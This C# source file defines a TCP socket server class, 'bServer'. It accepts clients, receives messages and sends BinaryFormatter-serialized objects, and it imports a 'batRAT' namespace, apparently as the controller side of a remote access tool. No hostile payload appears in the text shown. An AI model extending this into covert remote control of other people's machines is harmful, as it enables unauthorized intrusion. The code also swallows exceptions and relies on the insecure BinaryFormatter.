using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.Runtime.Serialization.Formatters.Binary;

using batRAT;

namespace Server.Core {
    public class bServer {

        public delegate void OnClientAcceptedHandler(Socket s);
        public OnClientAcceptedHandler OnClientAccepted;

        public delegate void OnDataSentHandler(Socket s, int sentBytes);
        public OnDataSentHandler OnDataSent;

        public delegate void OnDataReceivedHandler(Socket s, string data);
        public OnDataReceivedHandler OnDataReceived;

        public List<Socket> allConnections;

        Socket serverSocket;
        IPEndPoint ipEndPoint;

        public bServer(IPEndPoint _ipEndPoint) {
            ipEndPoint = _ipEndPoint;
            serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            allConnections = new List<Socket>();
        }

        public void StartListen() {
            serverSocket.Bind(ipEndPoint);
            serverSocket.Listen(10);
            
            serverSocket.BeginAccept(OnAccept, null);
        }

        void OnAccept(IAsyncResult ar) {
            Socket temp = serverSocket.EndAccept(ar);
            allConnections.Add(temp);
            OnClientAccepted(temp);
        }

        public void StartReceive() {
            if(allConnections.Count > 0) {
                StateObject stateObj = new StateObject();
                stateObj.socket = allConnections[0];
                stateObj.socket.BeginReceive(stateObj.buffer, 0, stateObj.buffer.Length, 0, (ar) => {
                    StateObject state = (StateObject)ar.AsyncState;
                    Socket handler = state.socket;

                    int bytesReceived = handler.EndReceive(ar);

                    string msg = Utilities.ExtractMessage(state, bytesReceived);
                    OnDataReceived(state.socket, msg);

                    if(bytesReceived != 0) {
                        StartReceive();
                    }

                }, stateObj);
            }
        }

        public void Send<T>(T _data, Socket _socket) {
            if(_data == null) {
                //Console.WriteLine("Data cannot be null!");
                return;
            }

            byte[] buffer;
            using(var ms = new MemoryStream()) {
                ms.Seek(0, SeekOrigin.Begin);
                new BinaryFormatter().Serialize(ms, _data);
                buffer = ms.ToArray();
            }
            
            _socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, OnSend, _socket);
         }

        void OnSend(IAsyncResult ar) {
            try {
                Socket handler = (Socket)ar.AsyncState;

                int bytesSent = handler.EndSend(ar);
                if(bytesSent <= 0) {
                    return;
                }
                OnDataSent(handler, bytesSent);
                //Console.WriteLine("Sent {0} bytes to client.", bytesSent);
            } catch(Exception e) {

            }
        }

    }
}
